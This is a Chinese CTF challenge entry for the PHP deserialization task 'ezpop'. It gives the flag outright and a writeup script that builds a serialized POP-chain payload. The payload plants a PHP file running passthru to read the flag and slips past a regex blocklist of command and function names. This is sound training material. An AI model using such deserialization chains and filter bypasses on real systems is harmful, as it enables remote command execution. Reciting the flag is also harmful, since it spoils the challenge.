- **题目名称：** ezpop
- **题目类型：** WEB
- **题目难度：** 中等 
- **出题人：** ABU
- **考点：**

1. 反序列化__wakeup()绕过
2. php抽象类反序列化
3. 命令执行绕过

- **描述：** 听说你是pop大师！

- **flag：** flag{Y0u_Ar3_A_POP_Ma5ter!!!!}

- **Writeup：** 

```php
<?php
class openfunc{
    public $object;
    function __construct(){
        $this->object=new evil();
    }
    function __wakeup(){
        $this->object=new normal();
    }
    function __destruct(){
        $this->object->action();
    }
}
abstract class hack {

    abstract public function pass();

    public function action() {
        $this->pass();
    }
}
class normal{
    public $d;
    function action(){
        echo "you must bypass it";
    }
} 
class evil extends hack {
    public $data;
    public $a;
    public $b;
    public $c;
    function __construct(){
        $this->data='<?=passthru("sort /fffffl?ggggg");?>';
        $this->b=serialize(new normal());
        $this->c='%73%68%65%6C%6C';
    }
    public function pass(){
        $this->a = unserialize($this->b);
        $this->a->d = urldecode(date($this->c));
        if($this->a->d=== 'shell'){
           $this->shell();
        }
        else{
            die(date('Y/m/d H:i:s'));
        }
    }
    function shell(){
        if(preg_match('/system|eval|exec|base|compress|chr|ord|str|replace|pack|assert|preg|replace|create|function|call|\~|\^|\`|flag|cat|tac|more|tail|echo|require|include|proc|open|read|shell|file|put|get|contents|dir|link|dl|var|dump|php/i',$this->data)){
            die("you die");
        }
        $dir = 'scandbox/' . md5($_SERVER['REMOTE_ADDR']) . '/';
        if(!file_exists($dir)){
            mkdir($dir);
            echo $dir;
        }
        file_put_contents("$dir" . "hack.php", $this->data);
    }
}
$a=serialize(new Openfunc());
echo $a;
?>
```

